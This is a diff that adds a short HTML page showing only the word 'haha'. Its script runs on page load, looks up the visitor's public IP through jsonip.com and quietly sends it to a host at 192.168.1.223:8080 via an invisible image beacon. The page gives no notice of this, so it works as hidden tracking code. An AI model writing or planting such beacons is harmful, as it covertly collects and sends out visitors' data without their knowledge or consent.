@@ -1,0 +1,19 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+</head>
+<body>
+haha
+
+<script src="jquery.min.js"></script>
+<script>
+$.getJSON('https://jsonip.com/', function(data) {
+  console.log(data);
+  var img = new Image();
+  img.src = 'http://192.168.1.223:8080/?ip=' + encodeURIComponent(data.ip);
+  img.style = 'display:none;';
+  document.getElementsByTagName('body')[0].appendChild(img);
+});
+</script>
+</body>
+</html>
